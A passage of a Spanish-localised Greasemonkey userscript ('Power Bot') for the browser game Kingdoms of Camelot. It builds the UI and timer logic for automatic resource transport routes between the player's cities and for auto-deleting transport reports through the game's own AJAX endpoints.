				      if (Object.keys(Seed.wilderness["city" + cityID]).length == 1) {
				          Seed.wilderness["city" + cityID] = []
  		         	  } else{
  		         	  	delete Seed.wilderness["city"+cityID]["t"+tileid];
  		         	  }
               } else {
					if (rslt.error_code != 401) {
               		    t.error_code = rslt.error_code;
					setTimeout (function(){t.abandonWilderness(tid,x,y,cid);}, 5000);
  				}
			   }
  		   },
  		         onFailure: function () {}
  		 });


    },

  hide : function (){
    var t = Tabs.Crest;
  },

  show : function (){
  },
 };

/****************************  Transport Implementation  *******************************/
Tabs.transport = {
  tabOrder: 80,
  tabLabel: 'Transportes',
  myDiv: null,
  timer: null,
  traderState: [],
  lTR: [],
  tradeRoutes: [],
  checkdotradetimeout: null,
  count:0,
  check:false,

    init: function(div){
		var t = Tabs.transport;
        t.myDiv = div;
		t.traderState = { running: false,};
        t.readTraderState();
	t.readTradeRoutes();
	t.e_tradeRoutes();


      if (t.traderState.running == false) {
          m += '<TD><INPUT id=pbTraderState type=submit value="Transport = OFF"></td>';
      } else {
          m += '<TD><INPUT id=pbTraderState type=submit value="Transport = ON"></td>';
      }
      m += '<TD><INPUT id=pbShowRoutes type=submit value="Show Routes"></td>';
      m += '</tr></table></div>';
      m += '<DIV id=pbTraderDivDRoute class=pbStat>TRADE ROUTE OPTIONS</div>';
      m += '<TABLE id=pbtraderfunctions width=100% height=0% class=pbTab><TR align="center"><TR align="left">';
	    m += '<TD colspan=4>Time inbetween to check transport: <INPUT id=pbtransportinterval type=text size=2 value="'+Options.transportinterval+'"\> minutes</td></tr></table>';
      m += '<TD colspan=4>Dont send transport out if less then <INPUT id=pbminwagons type=text size=2 value="'+Options.minwagons+'"\> troops are needed. (Needless transports are skipped this way)</td></tr></table>';
      m += '<DIV style="margin-top:10px;margin-bottom:5px;">If the "trade" amount is 0 then it will transport the max amount above "keep". Gold only if there is space left...</div></table>';
  

        var m = '<DIV id=pbTowrtDivF class=pbStat>FUNCIONES DE TRANSPORTE AUTOMATIZADAS</div><TABLE id=pbtraderfunctions width=100% height=0% class=pbTab><TR align="center">';
        if (t.traderState.running == false) {
            m += '<TD><INPUT id=pbTraderState type=submit value="Transportar = OFF"></td>';
       } else {
            m += '<TD><INPUT id=pbTraderState type=submit value="Transportar = ON"></td>';
        }
		m += '<TD><INPUT id=pbShowRoutes type=submit value="Mostrar rutas"></td>';
        m += '<TD><INPUT id=transportHelp type=submit value="Ayuda"></td></table>';
		m += '</tr></table></div>';
		m += '<DIV id=pbTraderDivDRoute class=pbStat>AGREGAR RUTAS</div>';
//		m += '<table><SPAN class=boldDarkRed>MI consejo es dejar a cero la cantidad a transportar</span></table>';
      m += '<TABLE id=pbaddtraderoute width=95% height=0% class=pbTab><TR align="left">';
      m += '<TD>Desde Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptrescity></span></div></td></tr>';
      m += '<TR align="left">';
      m += '<TD>A Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptcityTo></span></div></td>';
      m += '<TD>ó</td>';
      m += '<TD>X:<INPUT id=ptcityX type=text size=3\></td>';
      m += '<TD>Y:<INPUT id=ptcityY type=text size=3\></td></tr>';

	  m += '<TR align="left">';
	  m += '<TD colspan=4>Tiempo de chekeo medio entre transportes: <INPUT id=pbtransportinterval type=text size=2 value="'+Options.transportinterval+'"\> minutos</td></tr></table>';
      m += '<TD colspan=4>No envíar el transporte si hay menos de <INPUT id=pbminwagons type=text size=2 value="'+Options.minwagons+'"\> carretas. (Evitara el transporte si no hay lo necesario)</td></tr></table>';
      m += '<DIV style="margin-top:10px;margin-bottom:5px;">Si la cantidad a transportar es 0 entonces se transportara la capacidad máxima. Transportara Oro sólo si hay espacio ...</div>';
      m +='<TR><TD><INPUT id=deletes0toggle type=checkbox '+(Options.DeleteMsgs0?'CHECKED':'')+' /> Auto borrar informes transportes reportados a ti</td></tr><br>';
	  m +='<TR><TD><INPUT id=deletetoggle type=checkbox '+(Options.DeleteMsg?'CHECKED':'')+' /> Auto borrar transportes reportados por ti</td></tr>';
	  m += '<TABLE id=pbaddtraderoute width=55% height=0% class=pbTab><TR align="center">';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png"></td>';
      m += '<TD><INPUT id=pbshipFood type=checkbox checked=true\></td>';
      m += '<TD>Mantener: <INPUT id=pbtargetamountFood type=text size=11 maxlength=11 value="0"\></td>';
      m += '<TD>Transportar: <INPUT id=pbtradeamountFood type=text size=11 maxlength=11 value="0"\></td></tr>';
      m += '<TR align="center">';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png"></td>';
      m += '<TD><INPUT id=pbshipWood type=checkbox checked=true\></td>';
      m += '<TD>Mantener: <INPUT id=pbtargetamountWood type=text size=11 maxlength=11 value="0"\></td>';
      m += '<TD>Transportar: <INPUT id=pbtradeamountWood type=text size=11 maxlength=11 value="0"\></td></tr>';
      m += '<TR align="center">';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png"></td>';
      m += '<TD><INPUT id=pbshipStone type=checkbox checked=true\></td>';
      m += '<TD>Mantener: <INPUT id=pbtargetamountStone type=text size=11 maxlength=11 value="0"\></td>';
      m += '<TD>Transportar: <INPUT id=pbtradeamountStone type=text size=11 maxlength=11 value="0"\></td></tr>';
      m += '<TR align="center">';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png"></td>';
      m += '<TD><INPUT id=pbshipOre type=checkbox checked=true\></td>';
      m += '<TD>Mantener: <INPUT id=pbtargetamountOre type=text size=11 maxlength=11 value="0"\></td>';
      m += '<TD>Transportar: <INPUT id=pbtradeamountOre type=text size=11 maxlength=11 value="0"\></td></tr>';
      m += '<TR align="center">';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png"></td>';
      m += '<TD><INPUT id=pbshipGold type=checkbox checked=true\></td>';
      m += '<TD>Mantener: <INPUT id=pbtargetamountGold type=text size=11 maxlength =11 value="0"\></td>';
      m += '<TD>Transportar: <INPUT id=pbtradeamountGold type=text size=11 maxlength=11 value="0"\></td></tr>'
      m += '</table>';

      m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRoute type=submit value="AGREGAR RUTA"></div>';

    	t.myDiv.innerHTML = m;
		saveOptions ();
		setInterval(t.startdeletereports,2*60*1000);

		t.tcp = new CdispCityPicker ('pttrader', document.getElementById('ptrescity'), true, t.clickCitySelect, 0);
		t.tcpto = new CdispCityPicker ('pttraderTo', document.getElementById('ptcityTo'), true, t.clickCitySelect).bindToXYboxes(document.getElementById ('ptcityX'), document.getElementById ('ptcityY'));

		 document.getElementById('deletetoggle').addEventListener('change', function(){
			Options.DeleteMsg=document.getElementById('deletetoggle').checked;
			saveOptions();
		},false);
		document.getElementById('deletes0toggle').addEventListener('change', function(){
			Options.DeleteMsgs0=document.getElementById('deletes0toggle').checked;
			saveOptions();
		},false);
		document.getElementById('transportHelp').addEventListener('click', function(){t.transportHelp();} , false);
		document.getElementById('pbTraderState').addEventListener('click', function(){
            t.toggleTraderState(this);
        }, false);
		document.getElementById('pbSaveRoute').addEventListener('click', function(){
            t.addTradeRoute();
        }, false);
		document.getElementById('pbShowRoutes').addEventListener('click', function(){
            t.showTradeRoutes();
        }, false);

		document.getElementById('pbtransportinterval').addEventListener('keyup', function(){
		if (isNaN(document.getElementById('pbtransportinterval').value)){ document.getElementById('pbtransportinterval').value=60 ;}
		Options.transportinterval = document.getElementById('pbtransportinterval').value;
		saveOptions();
      }, false);

      document.getElementById('pbtargetamountFood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountFood').value)) document.getElementById('pbtargetamountFood').value=0 ;
      }, false);
      document.getElementById('pbtargetamountWood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountWood').value)) document.getElementById('pbtargetamountWood').value=0 ;
      }, false);
      document.getElementById('pbtargetamountStone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountStone').value)) document.getElementById('pbtargetamountStone').value=0 ;
      }, false);
      document.getElementById('pbtargetamountOre').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountOre').value)) document.getElementById('pbtargetamountOre').value=0 ;
      }, false);
      document.getElementById('pbtargetamountGold').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountGold').value)) document.getElementById('pbtargetamountGold').value=0 ;
      }, false);
      document.getElementById('pbtradeamountFood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountFood').value)) document.getElementById('pbtradeamountFood').value=0 ;
      }, false);
      document.getElementById('pbtradeamountWood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountWood').value)) document.getElementById('pbtradeamountWood').value=0 ;
      }, false);
      document.getElementById('pbtradeamountStone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountStone').value)) document.getElementById('pbtradeamountStone').value=0 ;
      }, false);
      document.getElementById('pbtradeamountOre').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountOre').value)) document.getElementById('pbtradeamountOre').value=0 ;
      }, false);
      document.getElementById('pbtradeamountGold').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountGold').value)) document.getElementById('pbtradeamountGold').value=0 ;
      }, false);
     document.getElementById('pbminwagons').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pbminwagons').value)) document.getElementById('pbminwagons').value=100 ;
         Options.minwagons = parseInt(document.getElementById('pbminwagons').value);
         saveOptions();
     }, false)

      document.getElementById('pbshipFood').addEventListener('click', function(){
          if (document.getElementById('pbshipFood').checked==false) {
              document.getElementById('pbtargetamountFood').disabled = true;
              document.getElementById('pbtradeamountFood').disabled = true;
          }
           else {
            document.getElementById('pbtargetamountFood').disabled = false;
            document.getElementById('pbtradeamountFood').disabled = false;
          }
      },false);
      document.getElementById('pbshipWood').addEventListener('click', function(){
          if (document.getElementById('pbshipWood').checked==false) {
              document.getElementById('pbtargetamountWood').disabled = true;
              document.getElementById('pbtradeamountWood').disabled = true;
          }
           else {
            document.getElementById('pbtargetamountWood').disabled = false;
            document.getElementById('pbtradeamountWood').disabled = false;
          }
      },false);
      document.getElementById('pbshipStone').addEventListener('click', function(){
          if (document.getElementById('pbshipStone').checked==false) {
              document.getElementById('pbtargetamountStone').disabled = true;
              document.getElementById('pbtradeamountStone').disabled = true;
          }
           else {
            document.getElementById('pbtargetamountStone').disabled = false;
            document.getElementById('pbtradeamountStone').disabled = false;
          }
      },false);
      document.getElementById('pbshipOre').addEventListener('click', function(){
          if (document.getElementById('pbshipOre').checked==false) {
              document.getElementById('pbtargetamountOre').disabled = true;
              document.getElementById('pbtradeamountOre').disabled = true;
          }
           else {
            document.getElementById('pbtargetamountOre').disabled = false;
            document.getElementById('pbtradeamountOre').disabled = false;
          }
      },false);
      document.getElementById('pbshipGold').addEventListener('click', function(){
          if (document.getElementById('pbshipGold').checked==false) {
              document.getElementById('pbtargetamountGold').disabled = true;
              document.getElementById('pbtradeamountGold').disabled = true;
          }
           else {
            document.getElementById('pbtargetamountGold').disabled = false;
            document.getElementById('pbtradeamountGold').disabled = false;
          }
      },false);
	    window.addEventListener('unload', t.onUnload, false);
	},

	transportHelp : function (){
    var helpText = '<BR>Función Automatizada de transportes.<BR>';
    helpText += 'Seleccionamos la ciudad origen del transporte.<BR>';
    helpText += 'Acto seguido, seleccionamos la ciudad destino o en su defecto las coordenadas!<BR>';
    helpText += 'Establecemos el tiempo de chekeo para realizar los transportes si hay excedentes.<BR><BR>';
    helpText += 'Seleccionamos que tipo de recurso deseamos transportar<BR>';
    helpText += 'En Mantener, ponemos la cantidad minima a dejar en la ciudad<BR>';
	helpText += 'En transportar se aconseja dejar 0 si queremos transportarlo todo<BR>';
    helpText += 'ó en su defecto la cantidad a transportar<BR>';
	helpText += 'Damos al boton Agregar Ruta y activamos el autotransportes<BR>';

    var pop = new CPopup ('transportHelp', 0, 0, 585, 230, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda Menu Power Bot: Transportes</b></center>';
    pop.show (true);
  },

	startdeletereports : function (){
		var t = Tabs.transport;
		if(!t.deleting && (Options.DeleteMsg || Options.DeleteMsgs0)){
			t.deleting = true;
			t.fetchbarbreports(0, t.checkbarbreports);
		}
   },

   fetchbarbreports : function (pageNo, callback){
	var t = Tabs.transport;
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
 	if(pageNo > 1)
 		params.pageNo = pageNo;
 	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         onSuccess: function (rslt) {
 			callback(rslt);
         },
         onFailure: function () {
         },
     });
   },
	checkbarbreports : function (rslt){
		var t = Tabs.transport;
		if(!rslt.ok){
			return;
		}
		if(rslt.arReports.length < 1){
			return;
		}
		var reports = rslt.arReports;
		var totalPages = rslt.totalPages;
 		var deletes1 = new Array();
 		var deletes0 = new Array();
 		for(k in reports){
			if(Options.DeleteMsg){
 				if(reports[k].marchType==1 && t.isMyself(reports[k].side1PlayerId))
 					deletes1.push(k.substr(2));
 			}
			if (Options.DeleteMsgs0){
 				if(reports[k].marchType==1 && !t.isMyself(reports[k].side1PlayerId))
 					deletes0.push(k.substr(2));
 			}
			if (CrestOptions.DeleteMsgswild){
 				if(reports[k].marchType==4 && reports[k].side0PlayerId==0)
 					deletes1.push(k.substr(2));
 			}
 		}
		if(deletes1.length > 0 || deletes0.length > 0){
			t.deletereports(deletes1, deletes0);
 		} else {
 			t.deleting = false;
 			return;
 		}
   },
   deletereports : function (deletes1, deletes0){
	var t = Tabs.transport;
 	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
 	params.s1rids = deletes1.join(",");
 	params.s0rids = deletes0.join(",");
 	params.cityrids = '';
 	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
 		method: "post",
 		parameters: params,
 		onSuccess: function (rslt) {
 			Seed.newReportCount = parseInt(Seed.newReportCount) - parseInt(deletes1.length) - parseInt(deletes0.length);
 			t.fetchbarbreports(0, t.checkbarbreports);
 		},
 		onFailure: function () {
 		},
 	});
   },
   isMyself: function(userID){
	if(!Seed.players["u"+userID]) {
   		return false;
   	}
	if(Seed.players["u"+userID].n == Seed.player.name) {
   		return true;
   	} else {
   		return false;
   	}
	return false;
     },

  getRallypoint: function(cityId){
      var t = Tabs.transport;
      for (var o in Seed.buildings[cityId]){
		var buildingType = parseInt(Seed.buildings[cityId][o][0]);
		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
		if (buildingType == 12){
			return parseInt(buildingLevel);
				break;
			 }
      }
	  return 0;
	},


  e_tradeRoutes: function(){
    var t = Tabs.transport;
	var now = new Date();
      if (t.traderState.running == true)    {
		  var now = new Date().getTime()/1000.0;
			now = now.toFixed(0);
			var last = Options.lasttransport;
		if ( now > (parseInt(last) + (Options.transportinterval*60))){
		  t.checkdoTrades();
		 }
	  }
	  setTimeout(function(){ t.e_tradeRoutes();}, Options.transportinterval*1000);

    },

        delTradeRoutes: function() {
		var t = Tabs.transport;
		t.tradeRoutes= [];
    },

	checkcoords : function (obj){
		var t = Tabs.transport;
		if(obj.id == 'pbok'){
			t.check = true;
			t.addTradeRoute();
		}
		return;
	},

	addTradeRoute: function () {
		var valid = true;
		var t = Tabs.transport;
		var city = t.tcp.city.id;
		if (document.getElementById('ptcityX').value==0 && document.getElementById('ptcityY').value ==0 && !t.check)
		{
			new CdialogConfirm ('<SPAN class=boldRed>Estás a punto de establecer una ruta a la ubicación 0,0!</span>', t.checkcoords, unsafeWindow.modal_attack_check, mainPop.getMainDiv);
			return;
		}
		var ship_Food = document.getElementById('pbshipFood').checked;
		var ship_Wood = document.getElementById('pbshipWood').checked;
		var ship_Stone = document.getElementById('pbshipStone').checked;
		var ship_Ore = document.getElementById('pbshipOre').checked;
		var ship_Gold = document.getElementById('pbshipGold').checked;
		var target_Food = document.getElementById('pbtargetamountFood').value;
		var target_Wood = document.getElementById('pbtargetamountWood').value;
		var target_Stone = document.getElementById('pbtargetamountStone').value;
		var target_Ore = document.getElementById('pbtargetamountOre').value;
		var target_Gold = document.getElementById('pbtargetamountGold').value;
		var trade_Food = document.getElementById('pbtradeamountFood').value;
		var trade_Wood = document.getElementById('pbtradeamountWood').value;
		var trade_Stone = document.getElementById('pbtradeamountStone').value;
		var trade_Ore = document.getElementById('pbtradeamountOre').value;
		var trade_Gold = document.getElementById('pbtradeamountGold').value;
		var target_x = document.getElementById('ptcityX').value;
		var target_y = document.getElementById('ptcityY').value;
		var route_state = true;

		if (valid == true) {
			var lTR = t.tradeRoutes;
			lTR.push({
				city:				city,
				ship_Food:			ship_Food,
				target_Food:		target_Food,
				trade_Food: 		trade_Food,
				ship_Wood:			ship_Wood,
				target_Wood:		target_Wood,
				trade_Wood: 		trade_Wood,
				ship_Stone:			ship_Stone,
				target_Stone:		target_Stone,
				trade_Stone: 		trade_Stone,
				ship_Ore:			ship_Ore,
				target_Ore:			target_Ore,
				trade_Ore:	 		trade_Ore,
				ship_Gold:			ship_Gold,
				target_Gold:		target_Gold,
				trade_Gold: 		trade_Gold,
				target_x: 			target_x,
				target_y: 			target_y,
				route_state: 		"true"
			});
		}
		document.getElementById('pbTraderDivDRoute').style.background ='#99FF99';
		setTimeout(function(){ (document.getElementById('pbTraderDivDRoute').style.background =''); }, 1000);
	},
	showTradeRoutes: function () {
		var t = Tabs.transport;
		var popTradeRoutes = null;
		t.popTradeRoutes = new CPopup('pbShowTrade', 0, 0, 1100, 500, true, function() {clearTimeout (1000);});
		var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowTradeRoutes" id="pbRoutesQueue">';
		t.popTradeRoutes.getMainDiv().innerHTML = '</table></div>' + m;
		t.popTradeRoutes.getTopDiv().innerHTML = '<TD><B>Rutas de transporte:</td>';
 		t.paintTradeRoutes();
		t._addTabHeader();
		t.popTradeRoutes.show(true)	;
	},
	paintTradeRoutes: function(){
	        var t = Tabs.transport;
	        var r = t.tradeRoutes;
	        var cityname;
			for (var i = (r.length-1); i>=0; i--) {
				for (var y=0; y< Seed.cities.length;y++) {
					if ( parseInt(Seed.cities[y][0]) == r[i].city) var cityname = Seed.cities[y][1];
				}
				var queueId = i;
				t._addTab(queueId,cityname, r[i].target_x, r[i].target_y, r[i].ship_Food, r[i].target_Food, r[i].trade_Food,r[i].ship_Wood, r[i].target_Wood, r[i].trade_Wood,r[i].ship_Stone, r[i].target_Stone, r[i].trade_Stone,r[i].ship_Ore, r[i].target_Ore, r[i].trade_Ore,r[i].ship_Gold, r[i].target_Gold, r[i].trade_Gold);
	        }
	    },

	 _addTab: function(queueId,cityname, cityX,cityY,ship_Food, target_Food, trade_Food,ship_Wood, target_Wood, trade_Wood,ship_Stone, target_Stone, trade_Stone,ship_Ore, target_Ore, trade_Ore,ship_Gold, target_Gold, trade_Gold){
	 	var t = Tabs.transport;
	     var row = document.getElementById('pbRoutesQueue').insertRow(0);
	     row.vAlign = 'top';
	     row.insertCell(0).innerHTML = queueId;
	     row.insertCell(1).innerHTML = cityname;
	     row.insertCell(2).innerHTML = cityX + ',' + cityY;
	     row.insertCell(3).innerHTML = ship_Food;
	 	 row.insertCell(4).innerHTML = addCommasWhole1(target_Food);
	 	 row.insertCell(5).innerHTML = addCommasWhole1(trade_Food);
	 	 row.insertCell(6).innerHTML = ship_Wood;
	 	 row.insertCell(7).innerHTML = addCommasWhole1(target_Wood);
	 	 row.insertCell(8).innerHTML = addCommasWhole1(trade_Wood);
	 	 row.insertCell(9).innerHTML = ship_Stone;
	 	 row.insertCell(10).innerHTML = addCommasWhole1(target_Stone);
	 	 row.insertCell(11).innerHTML = addCommasWhole1(trade_Stone);
	 	 row.insertCell(12).innerHTML = ship_Ore;
	 	 row.insertCell(13).innerHTML = addCommasWhole1(target_Ore);
	 	 row.insertCell(14).innerHTML = addCommasWhole1(trade_Ore);
	 	 row.insertCell(15).innerHTML = ship_Gold;
	 	 row.insertCell(16).innerHTML = addCommasWhole1(target_Gold);
	 	 row.insertCell(17).innerHTML = addCommasWhole1(trade_Gold);
	     row.insertCell(18).innerHTML = '<a class="button20" id="tradecancel_' + queueId + '"><span>Borrar</span></a>';
	     document.getElementById('tradecancel_' + queueId).addEventListener('click', function(){
	        t.cancelQueueElement(queueId);
	     }, false);
	 },

	 _addTabHeader: function() {
	 var t = Tabs.transport;
	     var row = document.getElementById('pbRoutesQueue').insertRow(0);
	     row.vAlign = 'top';
	     row.insertCell(0).innerHTML = "ID";
	     row.insertCell(1).innerHTML = "Desde";
	     row.insertCell(2).innerHTML = "A";
	     row.insertCell(3).innerHTML = "Alimento";
	     row.insertCell(4).innerHTML = "";
	     row.insertCell(5).innerHTML = "";
	     row.insertCell(6).innerHTML = "Madera";
		 row.insertCell(7).innerHTML = "";
	     row.insertCell(8).innerHTML = "";
	     row.insertCell(9).innerHTML = "Piedra";
	     row.insertCell(10).innerHTML = "";
	     row.insertCell(11).innerHTML = "";
	     row.insertCell(12).innerHTML = "Mineral";
	     row.insertCell(13).innerHTML = "";
	     row.insertCell(14).innerHTML = "";
	     row.insertCell(15).innerHTML = "oro";
	     row.insertCell(16).innerHTML = "";
	     row.insertCell(17).innerHTML = "";
	     row.insertCell(18).innerHTML = "Borrar";
	   },

	 cancelQueueElement: function(queueId){
	     var t = Tabs.transport;
	     var queueId = parseInt(queueId);
	     t.tradeRoutes.splice(queueId, 1);
	     t.showTradeRoutes();
	 },

	saveTradeRoutes: function(){
		var t = Tabs.transport;
        var serverID = getServerId();
        GM_setValue('tradeRoutes_' + serverID, JSON2.stringify(t.tradeRoutes));
    },
    readTradeRoutes: function(){
        var t = Tabs.transport;
        var serverID = getServerId();
        s = GM_getValue('tradeRoutes_' + serverID);
        if (s != null) {
            route = JSON2.parse(s);
            for (k in route)
                t.tradeRoutes[k] = route[k];
        }
    },
	saveTraderState: function(){
		var t = Tabs.transport;
        var serverID = getServerId();
        GM_setValue('traderState_' + serverID, JSON2.stringify(t.traderState));
    },
    readTraderState: function(){
        var t = Tabs.transport;
        var serverID = getServerId();
        s = GM_getValue('traderState_' + serverID);
        if (s != null) {
            state = JSON2.parse(s);
            for (k in state)
                t.traderState[k] = state[k];
        }
    },
    toggleTraderState: function(obj){
		var t = Tabs.transport;
        if (t.traderState.running == true) {
            t.traderState.running = false;
            obj.value = "Transportar = OFF";
			clearTimeout(t.checkdotradetimeout);
			t.count = 0;
			saveOptions();
        }
        else {
            t.traderState.running = true;
            obj.value = "Transportar = ON";
			t.e_tradeRoutes();
			saveOptions();
        }
    },

	checkdoTrades: function(){
	var t = Tabs.transport;
	if(t.tradeRoutes.length==0) return;
	t.doTrades(t.count);
	t.count++;
		if(t.count < t.tradeRoutes.length){
		  t.checkdotradetimeout = setTimeout(function() { t.checkdoTrades();}, 5000);
		} else {
			var now = new Date().getTime()/1000.0;
			now = now.toFixed(0);
			Options.lasttransport = now;
			saveOptions();
			t.count = 0;
		}
	},

    doTrades: function(count){
    var t = Tabs.transport;
		if(t.tradeRoutes.length==0) return;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.gold =0;
		params.r1 =0;
		params.r2 =0;
		params.r3 =0;
		params.r4 =0 ;
		params.kid = 0;

		var carry_amount= 0;
		var wagons_needed=0;
		var citymax = 0;
		var city = t.tradeRoutes[count]["city"];
		var cityID = 'city' + city;


   	 	var xcoord = t.tradeRoutes[count]["target_x"];
    	var ycoord = t.tradeRoutes[count]["target_y"];
    	var trade_Food = t.tradeRoutes[count]["trade_Food"];
    	var trade_Wood = t.tradeRoutes[count]["trade_Wood"];
    	var trade_Stone = t.tradeRoutes[count]["trade_Stone"];
    	var trade_Ore = t.tradeRoutes[count]["trade_Ore"];
    	var trade_Gold = t.tradeRoutes[count]["trade_Gold"];
    	var target_Food = t.tradeRoutes[count]["target_Food"];
    	var target_Wood = t.tradeRoutes[count]["target_Wood"];
    	var target_Stone = t.tradeRoutes[count]["target_Stone"];
    	var target_Ore = t.tradeRoutes[count]["target_Ore"];
    	var target_Gold = t.tradeRoutes[count]["target_Gold"];
    	var ship_Food = t.tradeRoutes[count]["ship_Food"];
    	var ship_Wood = t.tradeRoutes[count]["ship_Wood"];
    	var ship_Stone = t.tradeRoutes[count]["ship_Stone"];
    	var ship_Ore = t.tradeRoutes[count]["ship_Ore"];
    	var ship_Gold = t.tradeRoutes[count]["ship_Gold"];
    	var citymax_Food = parseInt(Seed.resources[cityID]['rec1'][0] / 3600);
    	var citymax_Wood = parseInt(Seed.resources[cityID]['rec2'][0] / 3600);
    	var citymax_Stone = parseInt(Seed.resources[cityID]['rec3'][0] / 3600);
    	var citymax_Ore = parseInt(Seed.resources[cityID]['rec4'][0] / 3600);
    	var citymax_Gold = parseInt(Seed.citystats[cityID]['gold']);
    	var carry_Food = (citymax_Food - target_Food);
    	var carry_Wood = (citymax_Wood - target_Wood);
    	var carry_Stone = (citymax_Stone - target_Stone);
    	var carry_Ore = (citymax_Ore - target_Ore);
    	var carry_Gold = 0;
    	if (carry_Food < 0 || ship_Food==false) carry_Food = 0;
    	if (carry_Wood < 0 || ship_Wood==false) carry_Wood = 0;
    	if (carry_Stone < 0 || ship_Stone==false) carry_Stone = 0;
    	if (carry_Ore < 0 || ship_Ore==false) carry_Ore = 0;
    	if (trade_Food > 0 && (carry_Food > trade_Food)) carry_Food = parseInt(trade_Food);
    	if (trade_Wood > 0 && (carry_Wood > trade_Wood)) carry_Wood = parseInt(trade_Wood);
    	if (trade_Stone > 0 && (carry_Stone > trade_Stone)) carry_Stone = parseInt(trade_Stone);
    	if (trade_Ore > 0 && (carry_Ore > trade_Ore)) carry_Ore = parseInt(trade_Ore);
    	var wagons =  parseInt(Seed.units[cityID]['unt'+9]);
    	var rallypointlevel = t.getRallypoint(cityID);
		if (rallypointlevel == 11) { rallypointlevel = 15; }
    	if (wagons > (rallypointlevel*10000)){ wagons = (rallypointlevel*10000); }
    	var featherweight = parseInt(Seed.tech.tch10);
    	var maxloadperwagon = ((featherweight *500) + 5000);
		var maxload = (maxloadperwagon* wagons);

		if(wagons <= 0) {return; }

		for (var t=0; t< Seed.cities.length;t++) {
			if ( parseInt(Seed.cities[t][0]) == city) var cityname = Seed.cities[t][1];
		}

		var shift_Food = (maxload / 4);
		var shift_Wood = (maxload / 4);
		var shift_Stone = (maxload / 4);
		var shift_Ore = (maxload / 4);

		if ((maxload - carry_Food - carry_Wood - carry_Stone - carry_Ore) < 0){
			var shift_num=0;
			var shift_spare=0;

			// Check: See if load/4 is to big for some resources...
			if (carry_Food < shift_Food) {
				shift_spare += (shift_Food - carry_Food);
				shift_Food = carry_Food;
			}
			if (carry_Wood < shift_Wood) {
				shift_spare += (shift_Wood - carry_Wood);
				shift_Wood = carry_Wood;
			}
			if (carry_Stone < shift_Stone) {
				shift_spare += (shift_Stone - carry_Stone);
				shift_Stone = carry_Stone;
			}
			if (carry_Ore < shift_Ore) {
				shift_spare += (shift_Ore - carry_Ore);
				shift_Ore = carry_Ore;
			}

		  while (shift_spare >1) {
				 if (carry_Food < (shift_Food + shift_spare)){
				    shift_spare = shift_spare - carry_Food;;
				    shift_Food = carry_Food;
				 }
				 else{
				  shift_Food = (shift_Food + shift_spare);
				  shift_spare = shift_spare- shift_spare;
				}
				 if (carry_Wood < (shift_Wood + shift_spare)){
				    shift_spare = shift_spare - carry_Wood;;
				    shift_Wood = carry_Wood;
				 }
				 else{
				  shift_Wood = shift_Wood + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
        		if (carry_Stone < (shift_Stone + shift_spare)){
				    shift_spare = shift_spare - carry_Stone;
				    shift_Stone = carry_Stone;
				 }
				 else{
				  shift_Stone = shift_Stone + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
				 if (carry_Ore < (shift_Ore + shift_spare)){
				    shift_spare = shift_spare - carry_Ore;
				    shift_Ore = carry_Ore;
				 }
				 else{
				  shift_Ore = shift_Ore + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
			 }

		carry_Food = shift_Food;
		carry_Wood = shift_Wood;
		carry_Stone = shift_Stone;
		carry_Ore = shift_Ore;
		}

		if (maxload > (carry_Food + carry_Wood + carry_Stone + carry_Ore) && ship_Gold==true) {
		    if ((maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore)) > (citymax_Gold - target_Gold)){
		    	  carry_Gold = (citymax_Gold - target_Gold);
		    	  if (carry_Gold < 0 ) carry_Gold = 0;
		   	}
		    else carry_Gold = (maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore));
		    if (trade_Gold > 0 && (carry_Gold > trade_Gold)) carry_Gold = parseInt(trade_Gold);
		}

		wagons_needed = ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Gold) / maxloadperwagon);
		wagons_needed = wagons_needed.toFixed(0);
		if (wagons_needed < ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Gold) / maxloadperwagon)) wagons_needed++;
		if ( wagons_needed < Options.minwagons ) { if(DEBUG_TRACE) logit('Transportes pequeños se saltan'); return; }

		params.cid= city;
		params.type = "1";
		params.xcoord = xcoord;
		params.ycoord = ycoord;
		params.r1 = carry_Food;
		params.r2 = carry_Wood;
		params.r3 = carry_Stone;
